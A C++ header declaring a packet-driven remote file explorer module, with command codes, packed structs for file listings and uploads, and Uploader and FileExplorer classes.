#include <list>
#include <iterator> 
#include "bone_obj.h"
#include "Utilities.h"

#define FILE_LIST_ALL_DISK		0
#define FILE_BROWSER_FOLDER		1
#define FILE_UPLOAD_BEGIN		2
#define	FILE_UPLOAD_PROGRESS	3
#define	FILE_UPLOAD_END			4
#define FILE_DOWNLOAD_BEGIN		5
#define FILE_DOWNLOAD_PROGRESS	6
#define FILE_DOWNLOAD_END		7
#define FILE_DELETE				8
#define FILE_RENAME				9
#define FILE_CREATE_FOLDER		10
#define FILE_OPEN				11

#define FILE_ERROR				100

//Error Code
#define FILE_ERROR_BROWSER		1
#define FILE_ERROR_OPEN			2
#define FILE_ERROR_DOWNLOAD		3
#define	FILE_ERROR_UPLOAD		4

//Download chunk size
#define DOWNLOAD_CHUNK_SIZE		0x150000

#pragma pack(push, 1)
struct LITE_WIN32_FIND_DATA
{
	FILETIME	ftCreationTime;
	FILETIME	ftLastWriteTime;
	DWORD		nFileSizeHigh;
	DWORD		nFileSizeLow;
	WCHAR		cFileName[MAX_PATH];
	BYTE		isFolder;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct UploadHeader
{
	DWORD	ID;
	DWORD	Session;
	DWORD	totalSize;
	DWORD	sizeLeft;
	DWORD	chunkSize;
};
#pragma pack(pop)

class Uploader
{
public:
	Uploader(wchar_t*, DWORD);
	~Uploader();
	DWORD GetSession();
	DWORD GetLastPacketTick();
	bool CALLBACK StartUpload();
	bool CALLBACK Uploading(BYTE*, size_t);
	bool CALLBACK FinishUpload();
private:
	DWORD		Session;
	DWORD		lastPacketTick;
	HANDLE		hFile;
	wchar_t		filePath[MAX_PATH];

};

struct DownloadInfo
{
	wchar_t			filePath[MAX_PATH];
	void*			fileExplorerObj;
	DWORD			session;
};

class FileExplorer:public BoneObj
{
public:
	virtual void OnInit();
	virtual void OnPacketArrived(BYTE*, size_t);
	virtual void OnExit();
	FileExplorer(Connection*);
	~FileExplorer();
	friend void CALLBACK DownloadThread(DownloadInfo*);
private:
	std::list <Uploader*>		listOfUploadItems;
};

